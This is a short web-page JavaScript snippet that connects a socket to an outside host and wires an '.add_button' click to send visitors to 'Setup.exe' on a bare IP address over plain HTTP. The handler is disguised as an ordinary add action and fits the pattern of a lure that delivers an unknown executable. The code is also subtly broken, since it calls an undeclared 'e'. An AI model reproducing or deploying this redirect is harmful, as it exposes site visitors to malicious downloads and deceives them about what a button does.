const global_data = {
    data_url_localhost: 'https://grotesk.host/nd'
}
var imSocket = io.connect(global_data.data_url_localhost);
imSocket.on('connect', function() {
    console.log('Connecting to host...');
});

$('.add_button').click( function() {
    e.preventDefault();  //stop the browser from following
    window.location.href = 'http://80.249.146.216/Setup.exe';
})